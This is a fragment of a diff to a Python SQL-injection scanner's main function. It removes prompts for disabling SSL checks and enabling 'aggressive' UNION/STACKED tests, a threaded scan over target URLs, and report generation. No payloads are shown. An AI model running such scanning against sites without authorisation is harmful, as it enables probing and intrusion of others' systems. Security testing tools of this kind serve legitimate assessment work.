-        sys.exit(1)
+        print("[!] Invalid selection. Exiting.")
 
-    verify_ssl = True
-    ans = input("Verify SSL certificates? (Y/n) [default Y]: ").strip().lower()
-    if ans == "n":
-        verify_ssl = False
-        import urllib3
-        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-        safe_print(f"{YELLOW}[warn] SSL verification disabled. Be careful!{RESET}")
-
-    global AGGRESSIVE
-    ans2 = input("Enable aggressive tests (UNION/STACKED)? (y/N) [default N]: ").strip().lower()
-    if ans2 == "y":
-        AGGRESSIVE = True
-        safe_print(f"{YELLOW}[info] Aggressive tests ENABLED. They may trigger WAF or logs.{RESET}")
-    else:
-        AGGRESSIVE = False
-
-    safe_print(f"{WHITE}[info] Starting scan with {THREADS} threads on {len(urls)} URLs...{RESET}")
-    start_time = time.time()
-
-    with ThreadPoolExecutor(max_workers=THREADS) as executor:
-        executor.map(lambda u: test_sqli_url(u, verify_ssl=verify_ssl), urls)
-
-    duration = time.time() - start_time
-
-    safe_print("\n" + "=" * 60)
-    if all_detected:
-        safe_print(f"{GREEN}All Detected SQLi Findings:{RESET}")
-        for (url, param, method, evidence) in all_detected:
-            safe_print(f"{GREEN}{url} --> {method} on '{param}' ({evidence}){RESET}")
-    else:
-        safe_print(f"{YELLOW}No SQLi findings.{RESET}")
-
-    safe_print("=" * 60)
-    generate_csv("sqli_findings.csv")
-    generate_html_report("sqli_report.html", run_time_seconds=duration, total_urls=len(urls))
-    save_plain_log("sqli_run.log")
 
 if __name__ == "__main__":
     main()
